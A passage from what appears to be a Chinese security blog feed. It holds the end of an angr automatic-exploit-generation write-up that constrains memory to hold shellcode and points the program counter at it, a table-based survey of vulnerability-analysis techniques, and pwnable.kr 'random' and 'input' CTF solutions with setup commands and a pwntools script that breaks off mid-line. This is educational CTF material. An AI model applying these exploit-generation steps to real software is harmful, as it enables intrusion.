class="keyword">and</span> all(x == y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(keys, k)):</span><br><span class="line">            <span class="keyword">yield</span> k, v</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> self.temporal_tracked_variables.items():</span><br><span class="line">        <span class="keyword">if</span> k[<span class="number">-1</span>] <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> len(k) &gt;= len(keys) <span class="keyword">and</span> all(x == y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(keys, k)):</span><br><span class="line">            <span class="keyword">yield</span> k, v</span><br></pre></td></tr></table></figure><p>返回值为元组，调试结果如下:<br><img src="/2019/01/09/insomnihack-aeg/symbol.png" alt=""></p><p>  通过 state.memory.addrs_for_name() 返回包含符号变量的内存地址。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addrs_for_name</span><span class="params">(self, n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Returns addresses that contain expressions that contain a variable</span></span><br><span class="line"><span class="string">    named `n`.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> self.mem.addrs_for_name(n)</span><br></pre></td></tr></table></figure><p>调试结果：<br><img src="/2019/01/09/insomnihack-aeg/mem.png" alt=""><br>至此，已能够通过输入数据控制 EIP 以及部分内存空间，后续要考虑的是 Payload 的布局问题。  </p><p>3）构造约束条件<br>Exploit 采用 ret2text 方式且不考虑安全机制，因此仅需找到一片足以放置 shellcode 的连续地址即可。示例中 shellcode 大小为 22。检查空间连续性的函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_continuity</span><span class="params">(address, addresses, length)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    dumb way of checking if the region at 'address' contains 'length' amount of controlled</span></span><br><span class="line"><span class="string">    memory.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> address + i <span class="keyword">in</span> addresses:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure><p>成功执行后，返回满足条件的起始地址，并将shellcode 转换为 BVV。   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">memory = ep.memory.load(buf_addr, len(shellcode))</span><br><span class="line">sc_bvv = ep.solver.BVV(shellcode)</span><br></pre></td></tr></table></figure><p>至此，构造生成 Exploit 的约束条件如下： </p><ul><li><code>memory == sc_bvv</code></li><li><code>ep.regs.pc == buf_addr</code>  </li></ul><h3 id="4、约束求解"><a href="#4、约束求解" class="headerlink" title="4、约束求解"></a>4、约束求解</h3><p>通过 satisfiable() 检查约束条件是否可解。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># check satisfiability of placing shellcode into the address</span></span><br><span class="line">    <span class="keyword">if</span> ep.satisfiable(extra_constraints=(memory == sc_bvv,ep.regs.pc == buf_addr)):</span><br><span class="line">        l.info(<span class="string">"found buffer for shellcode, completing exploit"</span>)</span><br><span class="line">        ep.add_constraints(memory == sc_bvv)</span><br><span class="line">        l.info(<span class="string">"pointing pc towards shellcode buffer"</span>)</span><br><span class="line">        ep.add_constraints(ep.regs.pc == buf_addr)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>约束可解，生成 Exploit。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">'%s-exploit'</span> % binary_name</span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(ep.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line">print(<span class="string">"%s exploit in %s"</span> % (binary_name, filename))</span><br><span class="line">print(<span class="string">"run with `(cat %s; cat -) | %s`"</span> % (filename, binary))</span><br></pre></td></tr></table></figure><p><img src="/2019/01/09/insomnihack-aeg/exp.png" alt=""></p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>该示例完整展示了 AEG 的全过程。通过调试，加深了对符号执行的理解。由于本例并不涉及符号执行所面临的路径爆炸与路径选择，因此对于理解前置约束条件及路径选择策略的助益并不明显，但对于理解符号变量以及内存布局还是起到一些作用。对于 AEG 来说，由于约束求解的问题不在考虑范围之内，控制流劫持的检测基本聚焦为 EIP 的检测。因此，如何根据崩溃点的内存布局及 Payload 情况，构造出合适的约束条件，成为问题的关键。</p>]]></content>
      
      
      <categories>
          
          <category> Angr </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>软件漏洞分析</title>
      <link href="/2018/12/20/Vulnerability-Analysis-Method/"/>
      <url>/2018/12/20/Vulnerability-Analysis-Method/</url>
      
        <content type="html"><![CDATA[<p>从理论层面对漏洞分析进行定义，并对常用漏洞分析方法进行总结。  </p><a id="more"></a><h2 id="软件漏洞分析的定义"><a href="#软件漏洞分析的定义" class="headerlink" title="软件漏洞分析的定义"></a>软件漏洞分析的定义</h2><ul><li>广义漏洞分析：指的是围绕漏洞所进行的所有工作，包括：<ul><li>漏洞挖掘：使用程序分析或软件测试技术发现软件中可能存在的未知的安全漏洞</li><li>漏洞检测：又称漏洞扫描，基于漏洞特征库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，以发现可利用的已知漏洞</li><li>漏洞应用：借助漏洞堆软件或其依附的目标系统进行模拟攻击，并且对攻击代码进行生存性验证</li><li>漏洞消除：对漏洞进行修复，包括漏洞防御、补丁修复、安全加固等</li><li>漏洞管控：包括漏洞收集与发布、漏洞资源的积累与分析、漏洞的准则规范的制定等</li></ul></li><li>狭义漏洞分析：特指漏洞挖掘，包括：<ul><li>架构安全分析：在设计阶段进行软件架构分析，从更高、更抽象的层次保障软件安全性</li><li>源代码漏洞分析：通常使用静态分析方法，整个过程包括源代码模型构造、漏洞模式提取、基于软件模型和漏洞模式的模式匹配</li><li>二进制漏洞分析：包括静态分析和动态分析两种</li><li>运行系统漏洞分析：分析对象是已经实际部署的软件系统，通过信息收集、漏洞检测和漏洞确认三个基本步骤堆软件系统进行漏洞分析</li></ul></li></ul><h2 id="软件分析技术概述"><a href="#软件分析技术概述" class="headerlink" title="软件分析技术概述"></a>软件分析技术概述</h2><table><thead><tr><th>技术类别</th><th>基本原理</th><th>分析阶段</th><th>分析对象</th><th>分析结果</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>软件架构安全分析</td><td>通过对软件架构进行建模，并对软件的安全需求或安全机制进行描述，然后检查架构模型直至满足所有安全需求</td><td>软件设计</td><td>软件架构</td><td>设计错误</td><td>考虑软件整体安全性，在软件设计阶段进行</td><td>缺少实用且自动化程度高的技术</td></tr><tr><td>源代码漏洞分析</td><td>通过对程序代码的模型提取及程序检测规则的提取，利用静态的漏洞分析技术分析结果</td><td>软件开发</td><td>源代码</td><td>代码缺陷</td><td>代码覆盖率高，能够分析出隐藏较深的漏洞，漏报率较低</td><td>需要人工辅助，技术难度大，对先验知识（历史漏洞）依赖性较大，误报率较高</td></tr><tr><td>二进制漏洞分析</td><td>通过对二进制可执行代码进行多层次（指令级、结构化、形式化等）、多角度（外部接口测试、内部结构测试等）的分析，发现软件程序中的安全缺陷和安全漏洞</td><td>软件设计、测试及维护</td><td>二进制代码</td><td>程序漏洞</td><td>不需要源代码，漏洞分析准确度较高，实用性广泛</td><td>缺乏上层的结构信息和类型信息，分析难度大</td></tr><tr><td>运行系统漏洞分析</td><td>通过向运行系统输入特定构造的数据，然后对输出进行分析和验证的方式来检测运行系统的安全性</td><td>运行及维护</td><td>运行系统</td><td>配置缺陷</td><td>考虑由多种软件共同构成的运行系统的整体安全性，检测项全面，准确度高</td><td>对分析人员的经验依赖度较大</td></tr></tbody></table><h3 id="源代码漏洞分析"><a href="#源代码漏洞分析" class="headerlink" title="源代码漏洞分析"></a>源代码漏洞分析</h3><table><thead><tr><th>技术</th><th>基本原理</th><th>优点</th><th>缺点</th><th>典型工具</th></tr></thead><tbody><tr><td>数据流分析</td><td>数据流分析是一种用于收集计算机程序在不同点计算的值的信息的技术。进行数据流分析的最简单的一种形式就是对控制流图的某个节点建立数据流方程，然后通过迭代计算，反复求解，直到到达不动点</td><td>具有更强的分析能力，适合需要考虑控制流信息且变量属性之操作十分简单的静态分析问题</td><td>分析效率低，过程间分析和优化算法复杂，编程工作量大，容易出错且效率低</td><td>Coverity, Prevent, Llocwork, Fortify, SCA, FindBugs, Checkmax</td></tr><tr><td>符号执行</td><td>符号执行是指用符号值替代真实值，模拟程序的执行，从而得到程序的内部结构及其相关信息，从而产生有针对性的测试用例</td><td>生成的测试用例有针对性，测试覆盖率较高，可以检测到深层次的问题</td><td>在进行系统化的符号执行时，会产生路径爆炸或是求解困顿等问题</td><td>EXE, KLEE, Clang, DART</td></tr><tr><td>污点分析</td><td>该技术对输入的数据建立污点传播标签，之后静态地跟踪被标记数据的传播过程，检查是否有危险函数或是危险操作</td><td>该技术的优点在于可以通过对数据的传播快速地找到典型的与输入数据相关的漏洞</td><td>该技术有时会受到编译器优化的影响，同时需要构造污点传播树，这种树的构造比较复杂，有时需要人工介入</td><td>Pixy, TAJ</td></tr><tr><td>模型检测</td><td>该技术主要通过将程序转换为逻辑公式，然后使用公理和规则来证明程序是否是一个合法的定理。如果程序合法，那么被测程序便满足先前所要求的安全特性</td><td>对路径的分析敏感，对于路径、状态的结果具有很高的精确性；检验并发错误能力较好，验证过程完全自动化</td><td>由于穷举了所有可能状态，增加了额外的开销；数据密集度较大时，分析难度很大；对时序、路径等属性，在边界处的近似处理难度大</td><td>SLAM, MOPS, Bandera</td></tr><tr><td>定理证明</td><td>该方法主要是将原有程序验证中由研究人员手工完成的分析过程变为自动推导，其主要目的是证明程序计算中的特性</td><td>使用严格的推导证明控制检测的进行，误报率低</td><td>某些域上的公式推导缺乏适用性，对新漏洞扩展性不高</td><td>ESC, Saturn</td></tr></tbody></table><h3 id="二进制漏洞分析"><a href="#二进制漏洞分析" class="headerlink" title="二进制漏洞分析"></a>二进制漏洞分析</h3><table><thead><tr><th>技术</th><th>基本原理</th><th>应用范围</th><th>优点</th><th>缺点</th><th>典型工具</th></tr></thead><tbody><tr><td>模糊测试</td><td>向被测程序发送随机或预先给定的数据</td><td>以文件、网络数据或是本地输入以其他对外部输入数据依赖较大的软件</td><td>原理简单，执行所需计算量较少，相关工具较为成熟，可以很方便地应用于大型软件的测试中</td><td>测试用例针对性低，覆盖率较低，测试结果不确定性较大</td><td>SPIKE, Peach, Sully, BeStorm, MU-4000</td></tr><tr><td>动态污点分析</td><td>对输入数据建立污染标签，在程序内部处理数据的同时加入污染标签的传播，通过分析标签的传播得出程序的内部结构</td><td>以文件、网络数据或是本地输入及其他对外部输入数据依赖较大的软件</td><td>可以获取程序内部的基本信息，易于发现与输入关联度较大的漏洞</td><td>需要动态插桩或是虚拟化等技术支持，实现较为复杂，并且污染传播算法对分析结果影响较大</td><td>TaintCheck, Dyta, Argos, Temu</td></tr><tr><td>基于模式的漏洞分析</td><td>利用中间表示语言或是其他工具将漏洞抽象为具有一定特殊性的模式，最终通过找到这种模式进而找到相关漏洞</td><td>需要对被分析漏洞表现形式有较深了解，并且需要对被分析软件进行一定转化</td><td>对漏洞表现形式抽象程度较高，随着建模准确度的提升，漏洞分析的准确度和速度都会有很大提升，代表着未来研究的方向</td><td>目前的漏洞建模较为简单，有时误报率较高</td><td>BinNavi</td></tr><tr><td>二进制代码比对</td><td>通过比对不同二进制文件，尤其是补丁文件与原文件之间的差异获取修改信息，从而定位并获取漏洞信息</td><td>需要有针对某一漏洞的补丁文件或是两个不同版本的同型软件</td><td>算法较为成熟，实现简单，有许多相关使用工具</td><td>由于需要补丁或新版软件的比对，所以该类技术仅能发现已被报告并修复的漏洞</td><td>Bindiff, IDA Compare, eEye Binary Diffing Suite</td></tr><tr><td>智能灰盒测试</td><td>利用动态符号执行等技术，针对被测软件生成有针对性的测试用例，从而提高测试用例的覆盖能力</td><td>以文件、网络数据或是本地输入及其他对外部输入数据依赖较大的软件</td><td>可以有效提升测试用例的覆盖率，从而提高发现漏洞的可能性</td><td>由于算法和计算量等问题，在使用时容易出现路径爆炸和求解困顿等问题，对大型软件的测试效果不是很理想</td><td>SAGE, SmartFuzz</td></tr></tbody></table><h3 id="运行系统漏洞分析"><a href="#运行系统漏洞分析" class="headerlink" title="运行系统漏洞分析"></a>运行系统漏洞分析</h3><table><thead><tr><th>技术</th><th>基本原理</th><th>应用范围</th><th>优点</th><th>缺点</th><th>典型工具</th></tr></thead><tbody><tr><td>配置管理测试</td><td>配置管理测试是对运行系统配置进行安全性测试，检查系统各配置是否符合运行系统的安全需求和制定的安全策略</td><td>检查配置漏洞</td><td>可以全面地分析和检查运行系统的配置项</td><td>需要对运行系统的业务需求，业务类型和运行环境有充分的了解，需要更多的人工介入</td><td>MBSA, Metasploit</td></tr><tr><td>通信协议测试</td><td>通信协议验证是对运行系统通信协议中潜在的安全漏洞进行检测。攻击验证是常用的通信协议验证手段。它利用已知的攻击手段对运行系统进行模拟攻击以判断通信协议是否存在某种类型的安全漏洞</td><td>检测通信协议中潜在的漏洞</td><td>攻击验证的通信协议验证手段检测结果较为准确，能够用于大规模运行系统</td><td>攻击验证方法只适用于某些特定类型的通信协议安全漏洞检测</td><td>Nessus, Nmap</td></tr><tr><td>授权认证测试</td><td>认证测试通过了解运行系统的授权、认证工作流程来尝试规避运行系统的授权、认证机制</td><td>检测运行系统中授权、认证机制中潜在的漏洞</td><td>分析结果较为准确</td><td>该类技术需要深入了解运行系统的授权认证工作，需要较多的人工参与分析工作</td><td>Nessus, WebScarab</td></tr><tr><td>数据验证测试</td><td>数据验证测试目的在于发现由于运行系统没有正确验证来自客户端或外界的数据而产生的安全漏洞。该类技术主要通过构造特定的输入以检测是否可以触发运行系统的某些特定类型安全漏洞</td><td>检测运行系统中授权、认证机制中潜在的漏洞</td><td>技术比较成熟，可用工具较多，操作简单</td><td>分析结果误报率比较高</td><td>MVS, AppScan</td></tr><tr><td>数据安全性验证</td><td>数据安全性验证旨在发现威胁运行系统内部数据自身安全性的漏洞</td><td>检测运行系统中在存储和传输数据时潜在的漏洞</td><td>技术比较成熟，可用工具较多，操作简单</td><td>分析结果误报率比较高</td><td>WireShark</td></tr></tbody></table><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《软件漏洞分析技术》</li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Pwnable（三）</title>
      <link href="/2018/12/14/Pwnable-3/"/>
      <url>/2018/12/14/Pwnable-3/</url>
      
        <content type="html"><![CDATA[<p>本文主要解决 pwnable 中的第六题 “random” 与第七题 “input”，涉及的知识点为伪随机数生成函数 random()与 Linux 基础知识。<br><a id="more"></a>  </p><h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><p>题目涉及知识点为伪随机数生成函数 rand()。rand()函数在生成随机数时，依赖初始“种子”值，该值可通过 srand() 进行指定。在未指定“种子”值时，rand() 以“1”为默认“种子”，每次生成的值为固定值。random.c 中的代码如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">        random = rand();        <span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过代码可知，仅需将 random 与 “0xdeadbeef” 进行异或运算，即可求出所需输入 key。在目标服务器上进行测试，random()为固定值 “1804289383”，运算 <code>1804289383 ^ 0xDEADBEEF = 3039230856</code>，因此输入数据为“3039230856”。<br><img src="/2018/12/14/Pwnable-3/random-flag.png" alt=""></p><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>本题涉及的知识点如下表所示。由于特殊字符“\x00”会导致输入数据的截断，因此需要通过编写脚本来获取 flag。看过各位大佬所写的 writeup，脚本的编写分为 C 语言版本与 Python 版本。由于个人近期在学习 pwntools，因此选用 Python 编写脚本，同时加深对 pwntools 的理解。  </p><table><thead><tr><th>知识点</th><th>解题技巧</th></tr></thead><tbody><tr><td>命令行参数传递</td><td>argv[‘A’] 等同于 argv[65]</td></tr><tr><td>I/O 重定向</td><td>使用 pipe 或 pwntools</td></tr><tr><td>环境变量</td><td>env 默认值为系统环境变量，可通过指定 env 传入程序</td></tr><tr><td>文件读写</td><td>普通的文件读写操作</td></tr><tr><td>socket</td><td>普通的 socket 通信过程</td></tr></tbody></table><p>Input.c 中的源码如下所示，共 5 个 Puzzle：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// argv</span></span><br><span class="line">        <span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// stdio</span></span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// env</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// file</span></span><br><span class="line">        FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// network</span></span><br><span class="line">        <span class="keyword">int</span> sd, cd;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">        sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        saddr.sin_family = AF_INET;</span><br><span class="line">        saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">        saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line">        <span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        listen(sd, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">        cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">        <span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// here's your flag</span></span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在解题时，首先将 stdin、stderr 与 “\x0a” 所需的内容保存为文件。由于服务器中只有“/tmp”目录具有写权限，因此在“/tmp”目录下建立“/tmp/l0l/”目录，并将所需文件保存在该目录下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'print "\x00\x0a\x00\xff"'</span> &gt; /tmp/l0l/stdin</span><br><span class="line">python -c <span class="string">'print "\x00\x0a\x02\xff"'</span> &gt; /tmp/l0l/stderr</span><br><span class="line">python -c <span class="string">'fd = open("/tmp/l0l/"+"\x0a", "w"); fd.write("\x00\x00\x00\x00"); fd.close()'</span></span><br><span class="line">ln <span class="_">-s</span> /home/input2/flag /tmp/l0l/flag</span><br></pre></td></tr></table></figure><p>对应的解题脚本如下：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">argv = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    argv.append(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">"/home/input2/input"</span></span><br><span class="line">argv[<span class="number">65</span>] = <span class="string">"\x00"</span></span><br><span class="line">argv[<span class="number">66</span>] = <span class="string">"\x20\x0a\x0d"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 1 cleared.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># input2@ubuntu:~$ python -c 'print "\x00\x0a\x02\xff"' &gt; 